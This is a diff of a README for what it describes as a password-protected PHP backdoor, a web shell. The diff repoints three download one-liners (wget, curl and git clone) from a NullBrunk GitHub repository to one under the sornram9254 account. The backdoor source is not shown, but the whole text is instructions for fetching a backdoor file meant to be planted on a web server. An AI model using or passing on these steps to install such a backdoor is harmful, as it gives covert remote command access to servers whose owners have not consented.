@@ -8,13 +8,13 @@ This is a simple backdoor protected with a password written in PHP. You can chan
 # Download :
 Here is some one liner to download it easely :
 ```bash
-wget https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php  
+wget https://raw.githubusercontent.com/sornram9254/WebShell/main/backdoor.php  
 ```
 ```bash
-curl -so backdoor.php https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php 
+curl -so backdoor.php https://raw.githubusercontent.com/sornram9254/WebShell/main/backdoor.php 
 ```
 ```bash
-git clone https://github.com/NullBrunk/WebShell.git && mv WebShell/backdoor.php ./ && rm -rf WebShell/
+git clone https://github.com/sornram9254/WebShell.git && mv WebShell/backdoor.php ./ && rm -rf WebShell/
 ```
 
 # Result
